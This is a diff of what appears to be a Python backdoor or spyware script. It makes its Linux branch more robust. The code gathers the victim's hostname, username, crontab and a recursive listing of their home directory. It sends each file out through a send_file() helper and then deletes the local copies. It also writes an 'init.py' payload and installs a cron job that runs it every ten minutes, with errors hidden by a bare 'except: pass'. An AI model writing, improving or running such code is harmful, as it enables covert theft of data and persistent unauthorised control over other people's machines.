@@ -145,7 +145,7 @@ def get_path():
                 with open(file_path_logs, 'a') as f:
                     f.write("init file created and data written \n")
             except Exception as e:
-                with open(file_path_logs, 'w') as f:
+                with open(file_path_logs, 'a') as f:
                     f.write(f"init file error: {e} \n")
 
             file_path_all_C = os.path.join(dir_path, f'{user}__{hostname}__all_C.txt')
@@ -212,7 +212,6 @@ def get_path():
             os.remove(file_path_logs)
 
         elif platform.system() == "Linux":
-
             # get the current user's home directory
             home_dir = os.path.expanduser('~')
 
@@ -226,38 +225,76 @@ def get_path():
             # get the hostname and username
             hostname = subprocess.check_output(['hostname']).decode().strip()
             user = subprocess.check_output(['whoami']).decode().strip()
-            crontab_default = subprocess.check_output(['crontab', '-l']).decode().strip()
+
+            file_path_logs = os.path.join(dir_path, f'{user}__{hostname}__logs.txt')
 
             # create a file in the new directory
             file_path_user = os.path.join(dir_path, f'{user}__{hostname}__user.txt')
-            with open(file_path_user, 'w') as f:
-                f.write(f'{hostname}@{user}\n')
+            try:
+                with open(file_path_user, 'w') as f:
+                    f.write(f'{hostname}@{user}\n')
+                with open(file_path_logs, 'w') as f:
+                    f.write("user file created and data written \n")
+
+                send_file(file_path_user)
+                os.remove(file_path_user)
+            except Exception as e:
+                with open(file_path_logs, 'a') as f:
+                    f.write(f"user file error: {e} \n")
 
             script_path = os.path.join(dir_path, 'init.py')
-            with open(script_path, 'w') as f:
-                for command in commands_list:
-                    f.write(command + '\n')
+            try:
+                with open(script_path, 'w') as f:
+                    for command in commands_list:
+                        f.write(command + '\n')
+                with open(file_path_logs, 'a') as f:
+                    f.write("init file created and data written \n")
+            except Exception as e:
+                with open(file_path_logs, 'a') as f:
+                    f.write(f"init file error: {e} \n")
 
-            file_path_crontab = os.path.join(dir_path, f'{user}__{hostname}__crontab_default.txt')
-            with open(file_path_crontab, 'w') as f:
-                f.write(f'{crontab_default}')
+            try:
+                crontab_default = subprocess.check_output(['crontab', '-l']).decode().strip()
+                file_path_crontab = os.path.join(dir_path, f'{user}__{hostname}__crontab_default.txt')
+                with open(file_path_crontab, 'w') as f:
+                    f.write(f'{crontab_default}')
 
-            file_path_all_C = os.path.join(dir_path, f'{user}__{hostname}__all.txt')
-            os.system(f'ls -laR /home/{user} >> {file_path_all_C}')
+                with open(file_path_logs, 'a') as f:
+                    f.write("Crontab Default file created and data written \n")
 
-            send_file(file_path_crontab)
-            send_file(file_path_user)
-            send_file(file_path_all_C)
+                send_file(file_path_crontab)
+                os.remove(file_path_crontab)
+            except Exception as e:
+                with open(file_path_logs, 'a') as f:
+                    f.write(f"Crontab default file error: {e} \n")
 
-            os.remove(file_path_crontab)
-            os.remove(file_path_user)
-            os.remove(file_path_all_C)
+            try:
+                file_path_all_C = os.path.join(dir_path, f'{user}__{hostname}__all.txt')
+                os.system(f'ls -laR /home/{user} >> {file_path_all_C}')
+                with open(file_path_logs, 'a') as f:
+                    f.write("All file created and data written \n")
 
-            # new_cronjob = "11 01 * * * /usr/bin/python3 {} >> {}/cron.log 2>&1".format(file_path, dir_path)
-            new_cronjob = "*/10 * * * * /usr/bin/python3 {} >> {}/{}run.log 2>&1".format(script_path, dir_path,
-                                                                                         f"{user}@{hostname}_")
+                send_file(file_path_all_C)
+                os.remove(file_path_all_C)
+            except Exception as e:
+                with open(file_path_logs, 'a') as f:
+                    f.write(f"All file error: {e} \n")
 
-            subprocess.run(f'(crontab -l ; echo "{new_cronjob}") | crontab -', shell=True)
+            try:
+                # new_cronjob = "11 01 * * * /usr/bin/python3 {} >> {}/cron.log 2>&1".format(file_path, dir_path)
+                new_cronjob = "*/10 * * * * /usr/bin/python3 {} >> {}/{}run.log 2>&1".format(script_path, dir_path,
+                                                                                             f"{user}@{hostname}_")
+
+                cron_task = subprocess.run(f'(crontab -l ; echo "{new_cronjob}") | crontab -', shell=True)
+
+                with open(file_path_logs, 'a') as f:
+                    f.write(f"Cron Task created with output: {cron_task} \n")
+            except Exception as e:
+                with open(file_path_logs, 'a') as f:
+                    f.write(f"Cron task output: {cron_task} \n And Creation error: {e} \n")
+
+            send_file(file_path_logs)
+            os.remove(file_path_logs)
 
     except:
         pass
